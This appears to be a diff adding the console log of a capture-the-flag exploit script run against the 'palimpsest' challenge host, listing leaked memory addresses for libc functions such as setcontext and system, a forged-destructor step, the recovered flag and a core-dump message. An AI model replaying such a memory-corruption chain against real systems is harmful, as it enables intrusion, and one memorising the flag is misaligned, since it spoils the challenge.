@@ -1,0 +1,12 @@
+$ python3 solve.py palimpsest-4db111bc4624.chals.z0d1ak.org 1337
+[+] proof accepted (indexes=[102, 193, 167, 92, 184, 74])
+[+] arena       = 0x555572b00300
+[+] implant     = 0x7fe461cb2000
+[+] write guard = 0x27322746
+[+] memcpy      = 0x7fe461e5a4c0
+[+] libc anchor = 0x7fe461cc1a00
+[+] setcontext  = 0x7fe461d03960
+[+] system      = 0x7fe461d11750
+[+] forged destructor; dropping victim
+zdk{ThE_deeP3sT_cUrRENt_WaS_7HE_C0MpILeR_cuRRENt}
+/usr/bin/timeout: the monitored command dumped core
